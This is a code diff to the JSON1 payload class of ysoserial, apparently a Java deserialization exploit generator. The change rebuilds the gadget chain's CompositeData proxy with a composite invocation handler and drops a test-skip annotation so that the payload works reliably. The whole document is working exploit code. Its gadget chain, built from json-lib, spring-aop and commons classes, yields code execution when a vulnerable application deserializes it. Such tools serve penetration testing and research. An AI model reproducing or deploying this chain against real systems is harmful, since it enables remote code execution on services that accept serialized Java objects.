@@ -2,7 +2,6 @@ package ysoserial.payloads;
 
 
 import ysoserial.payloads.annotation.Dependencies;
-import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
@@ -22,7 +21,7 @@ import javax.management.openmbean.TabularType;
 import javax.xml.transform.Templates;
 
 import org.springframework.aop.framework.AdvisedSupport;
-
+import com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl;
 import net.sf.json.JSONObject;
 
 
@@ -58,7 +57,7 @@ import net.sf.json.JSONObject;
  *
  */
 @SuppressWarnings ( {
-    "rawtypes", "unchecked"
+    "rawtypes", "unchecked", "restriction"
 } )
 @Dependencies ( {
     "net.sf.json-lib:json-lib:jar:jdk15:2.4", "org.springframework:spring-aop:4.1.4.RELEASE",
@@ -66,7 +65,6 @@ import net.sf.json.JSONObject;
     "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2", "commons-lang:commons-lang:2.6", "net.sf.ezmorph:ezmorph:1.0.6",
     "commons-beanutils:commons-beanutils:1.9.2", "org.springframework:spring-core:4.1.4.RELEASE", "commons-collections:commons-collections:3.1"
 } )
-@PayloadTest(skip="This depends on HashMap ordering")
 public class JSON1 implements ObjectPayload<Object> {
 
     /**
@@ -101,10 +99,13 @@ public class JSON1 implements ObjectPayload<Object> {
         // it's very likely that there are other proxy impls that could be used
         AdvisedSupport as = new AdvisedSupport();
         as.setTarget(payload);
-        final CompositeData cdsProxy = Gadgets.createProxy(
-            (InvocationHandler) Reflections.getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy").newInstance(as),
-            CompositeData.class,
-            ifaces);
+        InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections
+                .getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy").newInstance(as);
+        InvocationHandler cdsInvocationHandler = Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getCompositeType", rt));
+        CompositeInvocationHandlerImpl invocationHandler = new CompositeInvocationHandlerImpl();
+        invocationHandler.addInvocationHandler(CompositeData.class, cdsInvocationHandler);
+        invocationHandler.setDefaultHandler(delegateInvocationHandler);
+        final CompositeData cdsProxy = Gadgets.createProxy(invocationHandler, CompositeData.class, ifaces);
 
         JSONObject jo = new JSONObject();
         Map m = new HashMap();
